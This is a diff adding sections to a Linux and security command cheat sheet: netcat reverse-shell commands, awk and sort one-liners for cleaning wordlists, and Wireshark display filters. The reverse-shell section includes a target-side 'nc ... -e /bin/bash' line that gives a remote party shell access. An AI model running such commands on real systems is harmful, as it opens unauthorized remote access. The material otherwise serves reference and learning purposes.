@@ -15,6 +15,7 @@ _This is for educational purposes only._
 [DNS over HTTPS](#dns)  
 [Uncomplicated Firewall](#ufw)  
 [SSH](#ssh)  
+[Reverse Shell](#reverseshell)  
 [SELinux](#selinux)  
 [Disable USB Usage](#blacklist)  
 [Uninstall Unused Packages](#deborphan)  
@@ -26,6 +27,7 @@ _This is for educational purposes only._
 [OWASP Favicon Database](#owaspfavicon)  
 [Convert JPG/PNG to WebP](#imageconvert)  
 [Check device resources](#deviceresources)  
+[Dictionaries](#dictionaries)  
 
 ***
 ***
@@ -750,6 +752,32 @@ Copy file from local to remote machine:
 ```
 scp myfile.txt USERNAME@IPADDRESS:PATHNAME/SUBPATH/FILENAME.txt
 ```
+****
+
+<a name="reverseshell"></a>
+
+## Reverse Shell
+Same Network Remote Connection
+
+Origin Computer:
+```
+nc -nvlp PORT_NUMBER
+```
+OR
+```
+nc -l PORT_NUMBER  # (mirror all input)
+```
+```
+nc WEBSITE_IP_ADDRESS 80
+```
+
+Target Computer:
+```
+nc -nv IP_ADDRESS PORT_NUMBER -e /bin/bash (get bash access) OR
+```
+```
+nc IP_ADDRESS PORT_NUMBER
+```
 
 ****
 
@@ -1101,4 +1129,54 @@ lsmod
 Check the Disk Storage
 ```
 fdisk -l
+```
+
+****
+
+<a name="dictionaries"></a>
+## Dictionaries
+
+Remove duplicates
+```
+awk '!(count[$0]++)' old.txt > new.txt
+```
+
+Sort by length
+```
+awk '{print length, $0}' old.txt | sort -n | cut -d " " -f2- > new.txt
+```
+
+Sort by alphabetical order
+```
+sort old.txt | uniq > new.txt
+```
+
+Merge multiple text files into one
+```
+cat file1.txt file2.txt > combined.txt
+```
+
+Remove all blank lines
+```
+egrep -v "^[[:space:]]*$" old.txt > new.txt
+```
+
+****
+
+<a name="wireshark"></a>
+## Wireshark
+
+Useful commands:
+```
+ip.addr == 10.0.0.1
+tcp or dns
+tcp.port == 443
+tcp.analysis.flags
+!(arp or icmp or dns)
+follow tcp stream
+tcp contains facebook
+http.response.code == 200
+http.request
+tcp.flags.syn == 1
+wlan.fc.type_subtype==12
 ```
